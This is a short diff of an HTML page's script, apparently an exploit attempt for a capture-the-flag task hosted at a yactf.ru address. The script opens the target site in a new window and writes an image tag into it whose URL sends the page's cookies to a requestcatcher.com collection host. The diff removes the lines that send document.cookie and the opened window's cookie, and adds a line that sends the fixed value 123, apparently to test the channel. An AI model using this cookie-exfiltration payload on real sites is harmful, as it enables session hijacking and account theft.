@@ -3,12 +3,11 @@
 <script>
 
 var w1 = window.open('https://random-slap.yactf.ru')
-w1.document.write('<img src="https://test123.requestcatcher.com/test?cookie='+document.cookie+'"/>')
 
 // wait for window loaded
 setTimeout(() => {
-  //w1.document.write('<img src="https://test123.requestcatcher.com/test?cookie='+w1.document.cookie+'"/>')
-}, 5000)
+  w1.document.write('<img src="https://test123.requestcatcher.com/test?cookie=123"/>')
+}, 2000)
 
 </script>
 
